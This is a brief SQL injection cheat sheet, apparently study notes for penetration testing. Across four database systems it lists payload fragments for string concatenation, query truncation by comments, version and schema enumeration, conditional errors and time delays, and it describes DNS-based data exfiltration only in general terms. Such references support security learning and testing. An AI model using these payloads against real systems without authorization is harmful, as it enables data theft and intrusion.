#### CMDs
SQL Injection Cheat Sheet
String Concatenation
• Concatenate multiple strings into a single string.◇ Oracle: 'foo'||'bar'
◇ Microsoft: 'foo'+'bar'
◇ PostgreSQL: 'foo'||'bar'
◇ MySQL: 'foo' 'bar' (Note the space between the strings) or CONCAT('foo','bar')



Substring
◇ Extract a substring from a specified offset for a given length.▪ Oracle: SUBSTR('foobar', 4, 2)
▪ Microsoft: SUBSTRING('foobar', 4, 2)
▪ PostgreSQL: SUBSTRING('foobar', 4, 2)
▪ MySQL: SUBSTRING('foobar', 4, 2)



Comments
◇ Use comments to truncate a query.▪ Oracle: --comment
▪ Microsoft: --comment or /*comment*/
▪ PostgreSQL: --comment or /*comment*/
▪ MySQL: #comment, -- comment (Note the space after --), or /*comment*/



Database Version
◇ Query the database type and version.▪ Oracle: SELECT banner FROM v$version or SELECT version FROM v$instance
▪ Microsoft: SELECT @@version
▪ PostgreSQL: SELECT version()
▪ MySQL: SELECT @@version



Database Contents
◇ List the tables and their columns in the database.▪ Oracle: SELECT * FROM all_tables and SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
▪ Microsoft and PostgreSQL: SELECT * FROM information_schema.tables and SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
▪ MySQL: Similar to Microsoft and PostgreSQL.



Conditional Errors
◇ Test a boolean condition and trigger a database error if true.▪ Oracle: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
▪ Microsoft: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
▪ PostgreSQL: 1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
▪ MySQL: SELECT IF(YOUR-CONDITION-HERE, (SELECT table_name FROM information_schema.tables), 'a')



Time Delays
◇ Introduce a time delay.▪ Oracle: dbms_pipe.receive_message(('a'),10)
▪ Microsoft: WAITFOR DELAY '0:0:10'
▪ PostgreSQL: SELECT pg_sleep(10)
▪ MySQL: SELECT SLEEP(10)



Conditional Time Delays
◇ Trigger a time delay based on a condition.▪ Oracle: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
▪ Microsoft: IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
▪ PostgreSQL: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
▪ MySQL: SELECT IF(YOUR-CONDITION-HERE, SLEEP(10), 'a')



DNS Lookup
◇ Perform a DNS lookup to an external domain.▪ Specific techniques vary by database system and setup, involving advanced features or external tools like Burp Collaborator.



DNS Lookup with Data Exfiltration
◇ Exfiltrate data via DNS lookup.▪ Specific techniques vary, generally involving concatenation of query results with a domain name and triggering a DNS request to an external server.



Note: For MySQL, batched queries typically cannot be used for SQL injection, but there are exceptions with specific PHP or Python APIs.


